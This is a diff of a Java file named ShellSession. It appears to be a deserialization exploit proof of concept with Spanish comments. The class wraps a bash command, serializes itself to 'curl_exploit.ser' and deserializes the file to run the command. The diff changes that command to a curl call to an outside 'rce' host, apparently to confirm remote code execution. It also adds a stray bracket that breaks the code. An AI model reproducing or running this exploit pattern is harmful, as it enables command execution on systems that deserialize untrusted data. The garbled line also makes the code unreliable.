@@ -6,6 +6,8 @@ import java.io.FileOutputStream;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.Serializable;
+import java.util.Base64;
+
 
 
 public class ShellSession implements Serializable {
@@ -49,12 +51,10 @@ public class ShellSession implements Serializable {
 
     public static void main(String[] args) {
         // Comando a ejecutar como un arreglo de Strings
-        String[] command = {"/bin/bash", "-c", "curl www.sapo.shk0x.net"};
+        String[] command = {"/bin/bash", "-c", "curl rce.sapo.shk0x.net"};
 
-        // Crear el objeto CurlExploit con el comando especificado
         ShellSession exploit = new ShellSession(command);
 
-        // Serializar y deserializar para probar la ejecución
         System.out.println("Serializando el objeto...");
         serialize(exploit);
 
@@ -62,7 +62,6 @@ public class ShellSession implements Serializable {
         deserialize();
     }
 
-    // Serializar el objeto a un archivo llamado "curl_exploit.ser"
     public static void serialize(Object obj) {
         try {
             ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("curl_exploit.ser"));
@@ -74,8 +73,7 @@ public class ShellSession implements Serializable {
         }
     }
 
-    // Deserializar el objeto desde el archivo "curl_exploit.ser"
-    public static void deserialize() {
+]    public static void deserialize() {
         try {
             ObjectInputStream is = new ObjectInputStream(new FileInputStream("curl_exploit.ser"));
             is.readObject();
